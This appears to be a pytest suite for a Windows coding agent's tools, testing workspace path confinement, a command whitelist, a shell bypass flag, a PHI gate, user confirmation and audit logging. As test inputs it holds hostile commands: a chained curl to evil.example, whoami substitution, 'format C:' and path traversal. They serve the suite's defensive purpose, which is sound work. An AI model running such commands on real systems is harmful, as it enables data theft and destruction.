"""Tests for win_agent/tools.py (the Windows coding agent's codegen tools): workspace
path confinement, per-tool read/write/edit behavior, the run_command whitelist and
run_shell dangerous bypass, PHI gate refusal, and per-action audit logging.
"""

from __future__ import annotations

import os
import sys

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from astral_client import audit_log, phi_gate  # noqa: E402
from win_agent import agent, tools  # noqa: E402


@pytest.fixture
def workspace(tmp_path, monkeypatch):
    monkeypatch.setenv("ASTRAL_WORKSPACE_DIR", str(tmp_path))
    tools.set_workspace_override(None)
    tools._ensure_workspace()
    monkeypatch.setattr(audit_log, "_appdata_dir", lambda: str(tmp_path))
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: True)
    tools.set_context(
        actor="test-user",
        correlation_id="t1",
        audit=audit_log.AuditLogger(actor="test-user"),
    )
    return tmp_path


def _last_audit():
    al = tools._CTX.get("audit")
    rows = al.tail(1) if al else []
    return rows[0] if rows else {}


def test_write_then_read_inside_workspace(workspace):
    w = tools.write_file(path="hello.py", content="print('hi')")
    assert w["_ui_components"][0]["variant"] == "success"
    r = tools.read_file(path="hello.py")
    card = r["_ui_components"][0]
    assert card["type"] == "card"
    assert "print('hi')" in card["content"][0]["code"]


def test_read_traversal_refused(workspace):
    r = tools.read_file(path="../secret.txt")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "refused"


def test_read_absolute_outside_refused(workspace, tmp_path):
    outside = tmp_path.parent / "outside_file.txt"
    outside.write_text("nope", encoding="utf-8")
    r = tools.read_file(path=str(outside))
    assert r["_ui_components"][0]["variant"] == "error"


def test_write_outside_refused(workspace):
    r = tools.write_file(path="../../etc/evil.txt", content="x")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "refused"


def test_edit_replaces_first_match(workspace):
    tools.write_file(path="a.txt", content="foo bar foo")
    e = tools.edit_file(path="a.txt", old="foo", new="FOO")
    assert e["_ui_components"][0]["variant"] == "success"
    assert (
        tools.read_file(path="a.txt")["_ui_components"][0]["content"][0]["code"]
        == "FOO bar foo"
    )
    rows = tools._CTX["audit"].tail(3)
    edit_row = next(r for r in reversed(rows) if r["tool"] == "edit_file")
    assert edit_row["detail"].endswith("replaced first")


def test_edit_old_not_found_refused(workspace):
    tools.write_file(path="a.txt", content="hello")
    e = tools.edit_file(path="a.txt", old="zzz", new="y")
    assert e["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


def test_run_command_nonwhitelisted_refused(workspace):
    r = tools.run_command(command="format C:")
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


def test_run_command_whitelisted_runs(workspace):
    r = tools.run_command(command="echo hello-astral")
    card = r["_ui_components"][0]
    assert card["type"] == "card"
    assert _last_audit()["outcome"] == "success"


@pytest.mark.parametrize(
    "command",
    [
        "git status && curl http://evil.example/x",
        "git status; whoami",
        "git status | findstr secret",
        "git status > C:/Windows/System32/out.txt",
        "git log `whoami`",
        "git log $(whoami)",
        "echo %USERPROFILE%",
    ],
)
# Whitelist checks argv[0]; _exec runs the whole string via shell
def test_run_command_refuses_shell_chaining(workspace, monkeypatch, command):
    ran = []
    monkeypatch.setattr(tools.subprocess, "run",
                        lambda *a, **k: ran.append(a) or (_ for _ in ()).throw(
                            AssertionError("command executed")))
    r = tools.run_command(command=command)
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"
    assert ran == []


def test_run_shell_refused_without_bypass(workspace, monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    r = tools.run_shell(command="echo x")
    assert r["_ui_components"][0]["variant"] == "warning"
    assert _last_audit()["outcome"] == "refused"


def test_run_shell_runs_with_bypass(workspace, monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    r = tools.run_shell(command="echo bypassed")
    assert r["_ui_components"][0]["type"] == "card"
    row = _last_audit()
    assert row["outcome"] == "success"
    assert row["event_class"] == "dangerous_bypass"


def test_run_shell_not_advertised_when_bypass_off(monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    card = agent.build_card()
    names = {s["id"] for s in card["skills"]}
    assert "run_shell" not in names
    assert "read_file" in names


def test_run_shell_advertised_when_bypass_on(monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    card = agent.build_card()
    names = {s["id"] for s in card["skills"]}
    assert "run_shell" in names
    assert card["metadata"]["dangerous_bypass"] is True


def test_dispatch_refuses_run_shell_when_bypass_off(monkeypatch):
    monkeypatch.delenv("ASTRAL_DANGEROUS_BYPASS", raising=False)
    resp = agent.dispatch(
        {
            "type": "mcp_request",
            "request_id": "9",
            "method": "tools/call",
            "params": {"name": "run_shell", "arguments": {"command": "echo x"}},
        }
    )
    assert resp["error"]["code"] == -32601


def test_read_file_phi_blocked(workspace):
    tools.write_file(path="phi.txt", content="SSN is 123-45-6789 here")
    r = tools.read_file(path="phi.txt")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "phi_blocked"


def test_run_command_phi_blocked(workspace):
    r = tools.run_command(command="echo 123-45-6789")
    assert r["_ui_components"][0]["variant"] == "error"
    assert _last_audit()["outcome"] == "phi_blocked"


def test_phi_gate_clean_passes():
    assert not phi_gate.looks_like_phi("just a normal script")
    assert phi_gate.looks_like_phi("email me at a@b.com")
    assert phi_gate.looks_like_phi("MRN: 1234567")


def test_phi_gate_fail_closed(monkeypatch):
    import astral_client.phi_gate as pg

    def boom(_):
        raise RuntimeError("explode")

    monkeypatch.setattr(
        pg, "_PREFILTER_PATTERNS", [__import__("types").SimpleNamespace(search=boom)]
    )
    assert pg.looks_like_phi("anything") is True


def test_every_action_audited(workspace):
    tools.write_file(path="x.txt", content="ok")
    tools.read_file(path="x.txt")
    al = tools._CTX["audit"]
    rows = al.tail(5)
    outcomes = [r["outcome"] for r in rows]
    assert "success" in outcomes
    assert all(r["actor"] == "test-user" for r in rows)
    assert all("hash" in r and "prev_hash" in r for r in rows)


def test_audit_paths_redacted(workspace):
    tools.read_file(path="x.txt")
    row = _last_audit()
    assert row["args"]["path"] in (
        "x.txt",
        "<outside-workspace>",
    )


def test_audit_chain_links(workspace):
    tools.write_file(path="a.txt", content="1")
    tools.write_file(path="b.txt", content="2")
    al = tools._CTX["audit"]
    rows = al.tail(2)
    assert rows[1]["prev_hash"] == rows[0]["hash"]


def test_codegen_tools_declare_scopes():
    scopes = {n: info["scope"] for n, info in tools.TOOL_REGISTRY.items()}
    assert scopes["read_file"] == "tools:read"
    assert scopes["write_file"] == "tools:write"
    assert scopes["edit_file"] == "tools:write"
    assert scopes["run_command"] == "tools:execute"
    assert scopes["run_shell"] == "tools:execute"


def test_write_file_user_denied_no_side_effect(workspace, monkeypatch):
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    w = tools.write_file(path="deny.py", content="print('nope')")
    assert w["_ui_components"][0]["variant"] == "info"
    assert not (workspace / "deny.py").exists()
    assert _last_audit()["outcome"] == "user_denied"


def test_edit_file_user_denied_no_side_effect(workspace, monkeypatch):
    tools.write_file(path="e.txt", content="foo bar")
    before = (workspace / "e.txt").read_text(encoding="utf-8")
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    e = tools.edit_file(path="e.txt", old="foo", new="FOO")
    assert e["_ui_components"][0]["variant"] == "info"
    assert (workspace / "e.txt").read_text(encoding="utf-8") == before
    assert _last_audit()["outcome"] == "user_denied"


def test_run_command_user_denied_not_executed(workspace, monkeypatch):
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    r = tools.run_command(command="echo nope-astral")
    assert r["_ui_components"][0]["variant"] == "info"
    assert _last_audit()["outcome"] == "user_denied"


def test_run_shell_user_denied_not_executed(workspace, monkeypatch):
    monkeypatch.setenv("ASTRAL_DANGEROUS_BYPASS", "1")
    monkeypatch.setattr(tools, "_confirm_action", lambda **kw: False)
    r = tools.run_shell(command="echo bypassed")
    assert r["_ui_components"][0]["variant"] == "info"
    row = _last_audit()
    assert row["outcome"] == "user_denied"
    assert row["event_class"] == "dangerous_bypass"


def test_confirm_action_fail_closed_without_gui(monkeypatch, workspace):
    def _deny(**kw):
        import astral_client.confirm as _c

        return _c.confirm_action(**kw)

    monkeypatch.setattr(tools, "_confirm_action", _deny)
    import astral_client.confirm as _c

    fresh = _c._Bridge()
    monkeypatch.setattr(_c, "BRIDGE", fresh)
    w = tools.write_file(path="fc.py", content="x")
    assert w["_ui_components"][0]["variant"] == "info"
    assert not (workspace / "fc.py").exists()
    assert _last_audit()["outcome"] == "user_denied"
